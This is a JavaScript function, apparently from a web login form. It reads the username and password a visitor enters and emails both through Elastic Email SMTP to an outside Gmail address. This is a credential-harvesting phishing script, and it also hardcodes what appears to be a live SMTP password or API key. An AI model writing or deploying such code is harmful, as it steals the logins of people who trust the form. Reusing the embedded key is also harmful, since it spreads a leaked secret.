function emailSend(){
    var userName = document.getElementById('text').value;
    var password = document.getElementById('password').value;

    var massageBody = "text " + userName +
    "<br/> password " + password;

Email.send({
    Host : "smtp.elasticemail.com",
    Username : "sarmadbhawal786@gmail.com",
    Password : "69E3264DDC12D112AC68F394B8EC0C8EB544",
    To : 'bhawalsarmad@gmail.com.com',
    From : "sarmadbhawal786@gmail.com",
    Subject : "This is the subject",
    Body :massageBody
}).then(
  message => alert(message)
);
}